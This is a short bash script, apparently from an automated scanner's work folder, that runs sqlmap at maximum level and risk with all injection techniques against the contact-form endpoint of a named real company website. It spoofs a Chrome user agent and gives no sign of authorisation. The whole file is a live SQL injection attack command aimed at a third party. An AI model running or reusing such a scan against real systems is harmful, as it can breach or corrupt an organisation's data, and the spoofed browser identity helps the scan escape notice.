#!/bin/bash
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
cd "/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e"
rm -rf sqlmap_out
sqlmap -u "https://www.infinitycapital.bh/api/send" \
  --method=POST --data="fname=D10&lname=Probe&telInput=1234567&cname=QA&msgTxt=hello&check=" \
  --batch --level=5 --risk=3 --threads=2 --timeout=20 --retries=1 \
  --user-agent="$UA" --output-dir=sqlmap_out \
  --technique=BEUSTQ --dbms= --forms --skip-urlencode 2>&1 | tail -45
